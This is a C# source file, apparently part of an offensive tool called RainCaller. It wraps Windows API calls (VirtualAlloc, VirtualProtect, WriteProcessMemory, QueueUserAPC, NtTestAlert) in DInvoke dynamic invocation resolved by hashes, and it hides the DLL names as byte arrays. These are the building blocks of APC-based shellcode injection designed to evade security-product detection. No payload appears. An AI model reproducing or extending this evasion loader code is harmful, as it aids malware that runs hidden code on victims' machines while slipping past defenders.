using System;
using System.Text;
using System.Runtime.InteropServices;

namespace RainCaller
{
    class Native
    {
        public struct Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr GetCurrentThread();

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtTestAlert();
        }

        /*  
            Console.WriteLine("VirtualAlloc: "       + GetAPIHash("VirtualAlloc",       0x489c71c8));
            Console.WriteLine("VirtualProtect: "     + GetAPIHash("VirtualProtect",     0xff8af7dabc78a4c));
            Console.WriteLine("WriteProcessMemory: " + GetAPIHash("WriteProcessMemory", 0x98c7acfaaa7));
            Console.WriteLine("GetCurrentThread: "   + GetAPIHash("GetCurrentThread",   0x81b66d18ff2));
            Console.WriteLine("QueueUserAPC: "       + GetAPIHash("QueueUserAPC",       0x78c1c8a2df));

            VirtualAlloc:       765A35D4990A44EBFFA58ED9D11FCB3A - 0x489c71c8
            VirtualProtect:     36E630C1E245C34C48C49996DDD800D7 - 0xff8af7dabc78a4c
            WriteProcessMemory: E9875FBBAB315FCF2A085F380E111E78 - 0x98c7acfaaa7
            GetCurrentThread:   4AC373A2A9DDC9C64488A9002BD01E19 - 0x81b66d18ff2
            QueueUserAPC:       8F31B496099C60DB7B16BEEB10300365 - 0x78c1c8a2df
            NtTestAlert:        9830A80D786E0546B6E7D87F01C58C48 - 0x0450fad035012
        */

        //Obfuscation
        private static Encoding encoding = Encoding.UTF8;
        private static byte[] k32Enc = new byte[] { 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C }; //"kernel32.dll"
        private static byte[] ntdllEnc = new byte[] { 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C }; //ntdll.dll
        public static IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            object[] funcargs = { lpAddress, dwSize, flAllocationType, flProtect };
            return (IntPtr)DInvoke.DynamicAPIInvoke(encoding.GetString(k32Enc), "765A35D4990A44EBFFA58ED9D11FCB3A", 0x489c71c8, typeof(Delegates.VirtualAlloc), ref funcargs);
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            lpflOldProtect = 0;
            object[] funcargs = { lpAddress, dwSize, flNewProtect, lpflOldProtect };

            return (bool)DInvoke.DynamicAPIInvoke(encoding.GetString(k32Enc), "36E630C1E245C34C48C49996DDD800D7", 0xff8af7dabc78a4c, typeof(Delegates.VirtualProtect), ref funcargs);
        }

        public static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten)
        {
            lpNumberOfBytesWritten = new IntPtr();
            object[] funcargs = { hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten };

            return (bool)DInvoke.DynamicAPIInvoke(encoding.GetString(k32Enc), "E9875FBBAB315FCF2A085F380E111E78", 0x98c7acfaaa7, typeof(Delegates.WriteProcessMemory), ref funcargs);
        }

        public static IntPtr GetCurrentThread()
        {
            object[] funcargs = { };

            return (IntPtr)DInvoke.DynamicAPIInvoke(encoding.GetString(k32Enc), "4AC373A2A9DDC9C64488A9002BD01E19", 0x81b66d18ff2, typeof(Delegates.GetCurrentThread), ref funcargs);
        }

        public static UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData)
        {
            object[] funcargs = { pfnAPC, hThread, dwData };

            return (UInt32)DInvoke.DynamicAPIInvoke(encoding.GetString(k32Enc), "8F31B496099C60DB7B16BEEB10300365", 0x78c1c8a2df, typeof(Delegates.QueueUserAPC), ref funcargs);
        }

        public static uint NtTestAlert()
        {
            object[] funcargs = { };

            return (uint)DInvoke.DynamicAPIInvoke(encoding.GetString(ntdllEnc), "9830A80D786E0546B6E7D87F01C58C48", 0x0450fad035012, typeof(Delegates.NtTestAlert), ref funcargs);
        }

        public static uint MEM_COMMIT             = 0x1000,
                           PAGE_EXECUTE_READWRITE = 0x40,
                           PAGE_READWRITE         = 0x04;
    }
}
